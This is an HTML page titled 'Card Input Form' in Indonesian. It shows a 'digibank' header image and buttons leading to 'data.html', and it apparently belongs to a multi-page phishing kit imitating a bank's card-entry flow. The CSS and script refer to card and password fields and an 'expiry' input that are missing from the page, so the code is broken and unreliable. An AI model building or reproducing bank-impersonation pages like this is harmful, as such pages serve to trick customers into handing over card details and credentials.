<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Card Input Form</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@500&display=swap');

    body {
      margin: 0;
      background-color: #FAF6ED;
      font-family: 'Inter', sans-serif;
      display: flex;
      justify-content: center;
      padding: 24px;
      min-height: 100vh;
      align-items: flex-start;
    }

    .container {
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      gap: 24px;
      align-items: center;
    }

    .header-image {
      width: 100%;
      border-radius: 10px;
      object-fit: cover;
    }

    form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    label {
      display: block;
      margin-bottom: 6px;
      font-weight: 600;
      font-size: 16px;
      line-height: 1.2;
      color: #4B5563;
    }

    input[type="tel"],
    input[type="password"] {
      width: 100%;
      padding: 10px 14px;
      font-size: 16px;
      font-weight: 400;
      font-family: Arial, sans-serif;
      border: 1px solid #D1D5DB;
      border-radius: 6px;
      color: #000000;
      box-sizing: border-box;
    }

    .buttons {
      display: flex;
      justify-content: space-between;
      padding-top: 12px;
      align-items: center;
    }

    .btn-cancel {
      background: none;
      border: none;
      color: #4B5563;
      font-weight: 600;
      font-size: 16px;
      cursor: pointer;
      padding: 0;
      font-family: 'Inter', sans-serif;
    }

    .btn-submit {
      background-color: #C5302B;
      border: none;
      color: white;
      font-weight: 700;
      font-size: 16px;
      padding: 10px 28px;
      border-radius: 6px;
      cursor: pointer;
      font-family: 'Inter', sans-serif;
    }

    @media (max-width: 480px) {
      .container {
        max-width: 100%;
      }

      .header-image {
        height: auto;
        width: 350px;
        margin-top: -20px;
      }
       .header-ima {
        height: auto;
        width: 350px;
        margin-top: -20px;
        margin-left: -10px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="digibank.jpg" alt="Header Image" class="header-image" />
    <img src="beranda.jpg" alt="Header Image" class="header-ima" />
    <form>
    	<div class="buttons">
  <button type="button" class="btn-cancel">BATAL</button>
  <a href="data.html">
  <button type="button" class="btn-submit">LANJUT</button>
</a>

</div>
</form>
  </div>

  <script>
  	const btnCancel = document.querySelector('.btn-cancel');
  const btnSubmit = document.querySelector('.btn-submit');

  btnCancel.addEventListener('click', () => {
    // Arahkan ke halaman awal.html saat batal
    window.location.href = 'index.php';
  });
  
    document.getElementById('expiry').addEventListener('input', function(e) {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
      }
      e.target.value = value.slice(0, 5);
    });
  </script>
</body>
</html>
